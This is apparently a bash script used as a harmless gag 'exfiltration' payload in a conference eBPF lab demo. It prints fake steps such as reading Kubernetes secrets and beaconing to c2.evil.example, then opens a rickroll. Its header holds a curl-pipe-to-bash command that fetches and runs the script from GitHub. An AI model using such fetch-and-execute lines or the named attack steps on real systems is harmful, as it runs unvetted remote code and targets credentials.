#!/usr/bin/env bash
# attack.sh -- the "exfiltration" payload for the Phase 2 demo.
#
# The slide shows a boring `curl https://example.com` as the exfil step. This
# is the fun version: the demo fetches a payload from OUTSIDE the cluster (this
# very file, served raw from GitHub), and the payload is a harmless gag --
# theatrical fake "exfiltration" in the terminal, then it opens a rickroll in
# the browser. Nothing here reads a real secret or sends real data anywhere;
# every scary line below is a plain echo. The only real action is opening a
# YouTube URL.
#
# Served raw from the repo so the demo command is a genuine fetch-to-outside
# (keep the branch segment in sync with the default branch):
#   curl -s https://raw.githubusercontent.com/renatofenrir/bsides-krk-ebpf-lab/main/phase2-container-lab/attack/attack.sh | bash
#
# Run it on the LAPTOP (projected) for the browser rickroll. Piped into the
# attacker POD it still prints the theatre on the projected terminal; there is
# no browser in the pod, so it just prints the URL instead of opening it.

set -u

RICK="https://www.youtube.com/watch?v=dQw4w9WgXcQ"

if [ -t 1 ] && command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
  R=$(tput setaf 1); G=$(tput setaf 2); Y=$(tput setaf 3); C=$(tput setaf 6); B=$(tput bold); Z=$(tput sgr0)
else
  R=""; G=""; Y=""; C=""; B=""; Z=""
fi

type_out() { printf '%s' "$1"; shift; printf '%s\n' "${1:-}"; sleep "${2:-0.5}"; }

step() { printf '%s[*]%s %s' "$Y" "$Z" "$1"; sleep "${2:-0.6}"; printf ' %s%s%s\n' "$G" "${3:-done}" "$Z"; }

clear 2>/dev/null || true
printf '%s%s' "$B" "$R"
cat <<'BANNER'
   ____ _  _ ____ _ _    ___ ____ ____ ___ ____ ____
   |___  \/  |___ | |     |  |__/ |__|  |  |___ |  |
   |___ _/\_ |    | |___  |  |  \ |  |  |  |___ |__|
BANNER
printf '%s\n' "$Z"
type_out "${C}target:${Z} cluster secrets store" "" 0.4
type_out "${C}channel:${Z} covert (443/tcp, TLS)" "" 0.4
echo

step "enumerating service account tokens" 0.7 "17 found"
step "reading /var/run/secrets/kubernetes.io" 0.6 "exfiltrating"
step "dumping etcd keyspace" 0.9 "4.2 MB staged"
step "beaconing to c2.evil.example" 0.8 "ack"
printf '%s[*]%s uploading' "$Y" "$Z"
for _ in 1 2 3 4 5 6 7 8 9 10; do printf '%s#%s' "$G" "$Z"; sleep 0.12; done
printf ' %s100%%%s\n' "$G" "$Z"
sleep 0.5

echo
printf '%s%s' "$B" "$R"
cat <<'PWNED'
        ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
        ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
        ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
        ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
        ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝
        ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝
PWNED
printf '%s\n' "$Z"
sleep 0.6
printf '%s%s      ...just kidding. You have been RICKROLLED.%s\n\n' "$B" "$Y" "$Z"
sleep 0.8
printf '%s      Never gonna give you up:%s %s%s%s\n\n' "$C" "$Z" "$B" "$RICK" "$Z"

# Open it in the browser. Works on the laptop; degrades to just printing the
# URL anywhere without a browser (e.g. piped into the attacker pod).
opened=""
for cmd in xdg-open open termux-open-url; do
  if command -v "$cmd" >/dev/null 2>&1; then "$cmd" "$RICK" >/dev/null 2>&1 && opened=1 && break; fi
done
if [ -z "$opened" ] && command -v powershell.exe >/dev/null 2>&1; then
  powershell.exe -NoProfile start "$RICK" >/dev/null 2>&1 && opened=1
fi
[ -z "$opened" ] && printf '%s(no browser here -- open the link above)%s\n' "$Y" "$Z"

exit 0
